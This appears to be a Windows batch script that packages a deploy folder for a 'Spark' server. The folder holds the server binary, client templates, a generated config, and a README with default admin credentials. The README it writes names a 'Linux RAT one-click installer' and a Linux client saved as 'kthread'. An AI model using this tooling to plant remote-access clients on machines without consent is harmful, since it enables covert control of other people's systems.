@echo off
setlocal EnableExtensions

rem Generate deploy/ directory with server binary, built templates, default config, logs/
rem Usage: make.deploy.bat [server_binary_name] [keep-config]
rem   server_binary_name  default: server_windows_amd64.exe
rem   keep-config         pass "keep-config" to preserve existing deploy\config.json

cd /d "%~dp0.."
set "ROOT=%CD%\"

set "SERVER_EXE=%~1"
if /i "%SERVER_EXE%"=="keep-config" set "SERVER_EXE="
if "%SERVER_EXE%"=="" set "SERVER_EXE=server_windows_amd64.exe"

set "KEEP_CONFIG=0"
if /i "%~1"=="keep-config" set "KEEP_CONFIG=1"
if /i "%~2"=="keep-config" set "KEEP_CONFIG=1"

set "DEPLOY_DIR=%ROOT%deploy"
set "RELEASES_DIR=%ROOT%releases"
set "BUILT_DIR=%ROOT%built"
set "SERVER_SRC=%RELEASES_DIR%\%SERVER_EXE%"
set "CONFIG_BACKUP=%TEMP%\spark_config_backup.json"
set "KTHREAD_BACKUP=%TEMP%\spark_kthread_backup"
set "DATA_BACKUP=%TEMP%\spark_data_backup"

echo.
echo ========================================
echo  Spark deploy pack
echo ========================================
echo  Project : %ROOT%
echo  Server  : %SERVER_EXE%
echo  Output  : %DEPLOY_DIR%
echo ========================================
echo.

if not exist "%SERVER_SRC%" (
    echo [ERROR] Server binary not found: %SERVER_SRC%
    echo         Run build.all.bat first, or place the exe in releases\
    exit /b 1
)

if not exist "%BUILT_DIR%" (
    echo [ERROR] built\ directory not found: %BUILT_DIR%
    echo         Run scripts\build.client.bat first.
    exit /b 1
)

if exist "%DEPLOY_DIR%\kthread" (
    copy /y "%DEPLOY_DIR%\kthread" "%KTHREAD_BACKUP%" >nul
    echo        Will preserve existing deploy\kthread (Web UI generated)
)

if exist "%DEPLOY_DIR%\data" (
    if exist "%DATA_BACKUP%" rmdir /s /q "%DATA_BACKUP%"
    xcopy /e /i /y /q "%DEPLOY_DIR%\data" "%DATA_BACKUP%\" >nul
    echo        Will preserve existing deploy\data
)

if "%KEEP_CONFIG%"=="1" (
    if exist "%DEPLOY_DIR%\config.json" (
        copy /y "%DEPLOY_DIR%\config.json" "%CONFIG_BACKUP%" >nul
        echo        Will preserve existing config.json
    )
)

echo [1/7] Preparing deploy directory...
if exist "%DEPLOY_DIR%" rmdir /s /q "%DEPLOY_DIR%"
mkdir "%DEPLOY_DIR%"
mkdir "%DEPLOY_DIR%\built"
mkdir "%DEPLOY_DIR%\logs"
mkdir "%DEPLOY_DIR%\data"

echo [2/7] Copying server binary...
copy /y "%SERVER_SRC%" "%DEPLOY_DIR%\%SERVER_EXE%" >nul
if errorlevel 1 (
    echo [ERROR] Failed to copy server binary.
    exit /b 1
)

echo [3/7] Copying client templates (built/)...
xcopy /e /i /y /q "%BUILT_DIR%\*" "%DEPLOY_DIR%\built\" >nul
if errorlevel 1 (
    echo [ERROR] Failed to copy built templates.
    exit /b 1
)

echo [4/7] Generating config.json...
set "CONFIG_DONE=0"
if "%KEEP_CONFIG%"=="1" (
    if exist "%CONFIG_BACKUP%" (
        copy /y "%CONFIG_BACKUP%" "%DEPLOY_DIR%\config.json" >nul
        del "%CONFIG_BACKUP%" >nul 2>&1
        echo        Restored existing config.json
        set "CONFIG_DONE=1"
    )
)
if "%CONFIG_DONE%"=="0" (
    powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0gen-config.ps1" -OutPath "%DEPLOY_DIR%\config.json"
    if errorlevel 1 (
        echo [ERROR] Failed to generate config.json.
        exit /b 1
    )
    if not exist "%DEPLOY_DIR%\config.json" (
        echo [ERROR] config.json was not created.
        exit /b 1
    )
    echo        Generated config.json with fixed salt.
)

echo [5/7] Writing run.bat...
(
echo @echo off
echo cd /d "%%~dp0"
echo .\%SERVER_EXE% -config config.json
) > "%DEPLOY_DIR%\run.bat"

echo [6/7] Writing README...
(
echo Spark Server Deploy Package
echo =========================
echo.
echo Files:
echo   %SERVER_EXE%   - server executable
echo   config.json    - server configuration
echo   run.bat          - double-click to start server
echo   built\           - client templates for Web UI generation
echo   logs\            - log output directory
echo   data\            - device groups/aliases (device_meta.json)
echo   install_rat.sh       - Linux RAT one-click installer
echo   README-LINUX.txt   - Linux deploy instructions
echo   kthread            - Web UI generated Linux client (manual)
echo.
echo Start:
echo   run.bat
echo   or: .\%SERVER_EXE% -config config.json
echo.
echo Web UI:
echo   http://^<server-ip^>:8000/
echo   Default login: admin / ChangeMeChangeMe  ^(change in config.json^)
echo.
echo IMPORTANT:
echo   1. Edit config.json: change admin password if needed. Salt is fixed by default.
echo   2. Only change salt manually when required; then regenerate ALL clients.
echo   3. Open firewall TCP port 8000 ^(or your listen port^).
echo   4. Generate Linux client from Web UI -^> save as deploy\kthread before packing tar.
) > "%DEPLOY_DIR%\README.txt"

echo [7/7] Generating Linux install assets...
python "%~dp0gen_deploy_linux.py"
if errorlevel 1 (
    echo [WARN] Linux asset generation failed.
    exit /b 1
)

if exist "%KTHREAD_BACKUP%" (
    copy /y "%KTHREAD_BACKUP%" "%DEPLOY_DIR%\kthread" >nul
    del "%KTHREAD_BACKUP%" >nul 2>&1
    echo        Restored Web UI generated kthread
)

if exist "%DATA_BACKUP%" (
    xcopy /e /i /y /q "%DATA_BACKUP%\*" "%DEPLOY_DIR%\data\" >nul
    rmdir /s /q "%DATA_BACKUP%" >nul 2>&1
    echo        Restored existing data directory
) else (
    echo {"aliases":{},"groups":{}}> "%DEPLOY_DIR%\data\device_meta.json"
    echo        Created default data\device_meta.json
)

echo.
echo [OK] Deploy package ready:
echo      %DEPLOY_DIR%
echo.
dir /b "%DEPLOY_DIR%"
echo.
exit /b 0